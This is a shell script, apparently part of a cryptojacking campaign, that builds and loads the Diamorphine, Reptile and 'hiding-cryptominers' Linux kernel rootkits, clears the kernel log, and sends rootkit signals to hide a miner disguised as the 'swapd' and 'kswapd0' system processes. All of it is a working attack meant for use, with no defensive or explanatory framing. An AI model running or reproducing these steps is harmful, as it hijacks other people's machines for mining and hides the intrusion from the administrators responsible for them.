sudo NEEDRESTART_MODE=a apt install -t bookworm-backports linux-image-amd64 -y
sudo NEEDRESTART_MODE=a apt install -t bookworm-backports linux-headers-amd64 -y
zypper update -y
zypper install linux-generic linux-headers-$(uname -r) git make gcc msr-tools build-essential libncurses-dev -y
git clone https://github.com/m0nad/Diamorphine
cd Diamorphine/
make
insmod diamorphine.ko
dmesg -C
kill -63 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')

echo "[*] Reptile..."
cd /tmp
cd .ICE-unix
cd .X11-unix
rm -rf Diamorphine
rm -rf Reptile
NEEDRESTART_MODE=a apt-get update -y
yum update -y
yum install -y ncurses-devel
git clone https://github.com/f0rb1dd3n/Reptile/ && cd Reptile
make defconfig
make
make install
dmesg -C
/reptile/reptile_cmd hide
kill -31 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')

echo "[*] hide crypto miner."
cd /tmp
cd .X11-unix
git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make
dmesg -C && insmod rootkit.ko && dmesg
kill -31 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
rm -rf hiding-cryptominers-linux-rootkit/


systemctl status swapd
systemctl start swapd
systemctl status swapd

#systemctl restart p2pool
#systemctl status p2pool

kill -31 $(pgrep -f -u root config.json) &
kill -31 $(pgrep -f -u root config_background.json) &
kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` &
kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` &
kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` &
kill -63 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` &

echo "[*] Setup complete"
